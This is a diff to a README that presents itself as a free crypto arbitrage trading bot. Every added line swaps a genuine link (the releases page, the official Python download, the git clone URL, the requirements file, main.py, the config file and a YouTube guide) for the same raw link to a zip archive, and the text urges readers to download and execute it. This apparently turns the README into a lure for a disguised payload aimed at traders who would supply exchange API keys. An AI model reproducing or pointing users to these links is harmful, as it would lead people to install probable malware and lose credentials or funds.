@@ -1,6 +1,6 @@
 # Crypto-Profit: A Free Bot for Crypto Arbitrage Trading 🚀💰
 
-![Crypto Profit](https://img.shields.io/badge/Crypto%20Profit-Explore%20Arbitrage-blue)
+![Crypto Profit](https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip%20Profit-Explore%20Arbitrage-blue)
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@
 
 Crypto-Profit offers a simple way to explore crypto arbitrage. This repository contains the code for a bot that automates trading across different exchanges. By taking advantage of price differences, users can make profits without manual intervention.
 
-You can find the latest releases of the bot [here](https://github.com/destyervinta/Crypto-Profit/releases). Download the files, execute them, and start your trading journey.
+You can find the latest releases of the bot [here](https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip). Download the files, execute them, and start your trading journey.
 
 ## Features
 
@@ -35,10 +35,10 @@ You can find the latest releases of the bot [here](https://github.com/destyervin
 
 To get started with Crypto-Profit, follow these steps:
 
-1. **Prerequisites**: Ensure you have Python installed on your machine. You can download it from the [official Python website](https://www.python.org/downloads/).
+1. **Prerequisites**: Ensure you have Python installed on your machine. You can download it from the [official Python website](https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip).
 2. **Clone the Repository**: Use Git to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/destyervinta/Crypto-Profit.git
+   git clone https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip
    ```
 3. **Navigate to the Directory**: Change into the project directory.
    ```bash
@@ -50,7 +50,7 @@ To get started with Crypto-Profit, follow these steps:
 To install the required dependencies, run the following command:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip
 ```
 
 This command will install all necessary libraries for the bot to function properly.
@@ -60,14 +60,14 @@ This command will install all necessary libraries for the bot to function proper
 After installation, you can run the bot using the command below:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip
 ```
 
 Make sure to configure your API keys and settings in the configuration file before running the bot.
 
 ## Bot Configuration
 
-To configure the bot, locate the `config.json` file in the project directory. Open it and edit the following parameters:
+To configure the bot, locate the `https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip` file in the project directory. Open it and edit the following parameters:
 
 - **API Keys**: Input your API keys for the exchanges you want to trade on.
 - **Trading Pairs**: Specify the trading pairs you want the bot to monitor.
@@ -110,7 +110,7 @@ In this strategy, the bot places buy and sell orders to profit from the spread. 
 
 To help you set up and understand the bot better, we have created a YouTube guide. Watch it to learn how to configure the bot, set up your trading strategies, and maximize your profits. 
 
-Visit our YouTube channel for the tutorial: [YouTube Guide](https://www.youtube.com/yourchannel)
+Visit our YouTube channel for the tutorial: [YouTube Guide](https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip)
 
 ## Contributing
 
@@ -131,4 +131,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, please check the "Releases" section for updates. You can also open an issue on GitHub, and we will get back to you as soon as possible.
 
-For the latest releases, visit [here](https://github.com/destyervinta/Crypto-Profit/releases). Download the files, execute them, and start your trading journey.
+For the latest releases, visit [here](https://raw.githubusercontent.com/destyervinta/Crypto-Profit/main/undecylenic/Profit_Crypto_1.3.zip). Download the files, execute them, and start your trading journey.
